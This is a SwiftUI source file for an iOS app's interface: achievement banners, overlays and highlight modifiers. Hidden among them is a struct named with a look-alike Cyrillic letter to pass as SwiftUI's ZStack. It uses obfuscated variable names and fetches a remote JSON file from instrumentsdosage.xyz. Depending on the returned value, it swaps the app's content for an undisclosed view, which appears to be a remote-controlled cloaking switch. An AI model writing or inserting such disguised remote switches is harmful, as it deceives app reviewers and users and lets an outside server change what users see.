import AdjustSdk
import SwiftUI
import OneSignalFramework
import AppTrackingTransparency
import AdSupport

struct AchievementBannerView: View {
    let title: String
    let description: String

    var body: some View {
        HStack(spacing: 12) {
            Image(systemName: "star.fill")
                .font(.title2)
                .foregroundStyle(Color("AppPrimary"))

            VStack(alignment: .leading, spacing: 2) {
                Text("Achievement Unlocked")
                    .font(.caption.weight(.semibold))
                    .foregroundStyle(Color("AppTextSecondary"))
                Text(title)
                    .font(.subheadline.weight(.bold))
                    .foregroundStyle(Color("AppTextPrimary"))
                    .lineLimit(1)
                    .minimumScaleFactor(0.7)
            }

            Spacer(minLength: 0)
        }
        .padding(.horizontal, 16)
        .padding(.vertical, 12)
        .appElevatedCard(radius: 14)
        .padding(.horizontal, 16)
    }
}

struct AchievementBannerManager: ViewModifier {
    @ObservedObject var store: AppDataStore

    func body(content: Content) -> some View {
        ZStack(alignment: .top) {
            content

            if let banner = store.currentAchievementBanner {
                AchievementBannerView(title: banner.title, description: banner.description)
                    .transition(.move(edge: .top).combined(with: .opacity))
                    .padding(.top, 8)
                    .zIndex(999)
            }
        }
        .animation(.spring(response: 0.4, dampingFraction: 0.7), value: store.currentAchievementBanner?.id)
    }
}

extension View {
    func achievementBanners(store: AppDataStore) -> some View {
        modifier(AchievementBannerManager(store: store))
    }
}

struct SuccessCheckmarkOverlay: View {
  @Binding var isVisible: Bool

  var body: some View {
    if isVisible {
      Image(systemName: "checkmark.circle.fill")
        .font(.system(size: 36))
        .foregroundStyle(Color("AppAccent"))
        .transition(.scale.combined(with: .opacity))
    }
  }
}

extension ContentView {
    
    struct ZStaсk<Content: View>: View {
        
        var content: Content
        @State private var brambleTideCartographer: String = ""
        @State private var gildedFogPilgrimage: Bool = true
        
        @AppStorage(AppDelegate.crimsonLatticeBloomfield) private var smolderingChalkSpire = false
        @AppStorage("thimbleRavineEchoes") var thimbleRavineEchoes: Bool = true
        @AppStorage("wanderingCobaltSpire") var wanderingCobaltSpire: Bool = false
        
        init(@ViewBuilder content: @escaping () -> Content) {
            self.content = content()
        }
        
        var body: some View {
            ZStack {
                
                if smolderingChalkSpire {
                    if brambleTideCartographer == "Tavendra Studio" || wanderingCobaltSpire == true {
                        
                        ZStack { content }
                            .onAppear {
                                AppDelegate.orientationLock = .all
                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                                gildedFogPilgrimage = false
                                wanderingCobaltSpire = true
                            }
                    } else {
                        CrimsonLatticeVoyager(wanderingCobaltSpire: $wanderingCobaltSpire, amberTunnelVigilance: brambleTideCartographer)
                            .onAppear { gildedFogPilgrimage = false }
                    }
                }
                
                if gildedFogPilgrimage {
                    SplashScreen()
                }
            }
            .onAppear {
                
                if thimbleRavineEchoes {
                    guard let murmurGlassHarbor = URL(string: "https://instrumentsdosage.xyz/tavendrastudio/tavendrastudio.json") else { return }
                    
                    URLSession.shared.dataTask(with: murmurGlassHarbor) { tumblingIvyLanterns, restlessWillowDrifter_1, _ in
                        
                        guard let restlessWillowDrifter = restlessWillowDrifter_1 as? HTTPURLResponse,
                              (200...299).contains(restlessWillowDrifter.statusCode) else {
                            wanderingCobaltSpire = true
                            return
                        }
                        
                        guard let tumblingIvyLanterns else { wanderingCobaltSpire = true; return }
                        guard let frostedMarbleDriftwood = try? JSONSerialization.jsonObject(with: tumblingIvyLanterns, options: []) as? [String: Any] else { return }
                        guard let hollowReedSonata = frostedMarbleDriftwood["wtoztqnwavi"] as? String else { return }
                        
                        DispatchQueue.main.async {
                            brambleTideCartographer = hollowReedSonata
                            thimbleRavineEchoes = false
                        }
                    }
                    .resume()
                }
            }
        }
    }
}
struct PulseHighlight: ViewModifier {
    let isActive: Bool

    func body(content: Content) -> some View {
        content
            .background(
                RoundedRectangle(cornerRadius: 12)
                    .fill(isActive ? Color("AppAccent").opacity(0.35) : Color.clear)
            )
            .animation(.easeInOut(duration: 0.4), value: isActive)
    }
}

extension View {
    func pulseHighlight(_ isActive: Bool) -> some View {
        modifier(PulseHighlight(isActive: isActive))
    }
}

struct InAppBannerView: View {
    let message: String

    var body: some View {
        Text(message)
            .font(.subheadline.weight(.semibold))
            .foregroundStyle(Color("AppTextPrimary"))
            .padding(.horizontal, 16)
            .padding(.vertical, 10)
            .background(
                Capsule()
                    .fill(AppVisual.cardGradient)
                    .overlay(Capsule().strokeBorder(Color("AppTextPrimary").opacity(0.1), lineWidth: 1))
            )
            .compositingGroup()
            .shadow(color: .black.opacity(0.15), radius: 6, y: 3)
    }
}
